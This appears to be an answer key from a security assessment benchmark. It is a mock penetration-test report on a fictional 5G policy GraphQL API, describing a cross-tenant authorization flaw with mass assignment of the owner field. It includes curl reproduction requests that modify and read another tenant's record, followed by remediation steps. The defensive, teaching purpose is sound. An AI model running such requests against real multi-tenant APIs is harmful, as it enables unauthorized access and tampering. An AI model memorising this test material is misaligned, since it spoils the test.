# Expected Response

## System
- Domain: Telecom / 5G Core
- System: SpectreNet Policy Control
- Example ID: GQL-0065

## Priority Findings

### Finding 1: Cross-Tenant 5G Policy Resource Modification via Parameter Escalation (Pattern 10.2)
**Severity:** Critical
**Category:** BOLA / Single-User Vulnerability

**Summary:**
Per §5.0 (Pattern 10.2 — Parameter escalation / own session scope extension): "The resolver handling `resourceId` does not enforce ownership or tenancy boundaries, enabling Pattern 10.2 exploitation." An attacker from `tenant-6611` issued `updateResource(id: "R-2065", input: {status: "approved", ownerId: "attacker-6611eb0a"})` against a 5G policy resource owned by `tenant-eb0a`. The mutation succeeded (HTTP 200), updating the resource status and injecting the attacker's `ownerId` — a mass-assignment escalation.

**Evidence from HAR:**
- Request: `POST https://api.spectrenet-policy-co.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-6611`
- Mutation: `updateResource(id: "R-2065", input: {status: "approved", ownerId: "attacker-6611eb0a"}) { resourceId status }`
- Response `200 OK`; cross-tenant data returned: `tenantId: "tenant-eb0a"`, `sensitiveField: "CONFIDENTIAL-6611eb0a"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-6611eb0a`
- Note: HAR response body shows `getResource` — the update mutated the victim's record and returned it.

**Root Cause (§4.0 RISK-GQL-065):** `getResource` / `updateResource` resolvers fetch by ID only; `ownerId` field is client-writable (mass assignment).

## Steps to Reproduce

### Step 1 — Parameter escalation via updateResource mutation (HAR)
```bash
curl -s -X POST https://api.spectrenet-policy-co.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-6611" \
  -d '{"query": "mutation { updateResource(id: \"R-2065\", input: {status: \"approved\", ownerId: \"attacker-6611eb0a\"}) { resourceId status } }"}'
```
**Vulnerable:** Returns updated victim record from `tenant-eb0a`; `ownerId` set to attacker value. **Secure:** FORBIDDEN.

### Step 2 — Verify cross-tenant read also possible
```bash
curl -s -X POST https://api.spectrenet-policy-co.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-6611" \
  -d '{"query": "query { getResource(id: \"R-2065\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** `CONFIDENTIAL-6611eb0a` from `tenant-eb0a`. **Secure:** FORBIDDEN.

## Evidence Map
| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-065 | `getResource` no tenantId check |
| context.txt §5.0 | Pattern 10.2 | Parameter escalation |
| HAR request | mutation input | `ownerId: "attacker-6611eb0a"` — mass assignment |
| HAR response | tenantId | Victim: `tenant-eb0a` |
| HAR response | sensitiveField | `CONFIDENTIAL-6611eb0a` |

## Remediation
1. Resolver tenant guard on `updateResource`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Strip `ownerId` and `tenantId` from `ResourceInput` — never allow client to set ownership fields.
3. Redis cache key includes `tenantId`: `resource:{tenantId}:{resourceId}`.
4. Return FORBIDDEN (HTTP 403) if resolved tenantId != JWT tenantId.
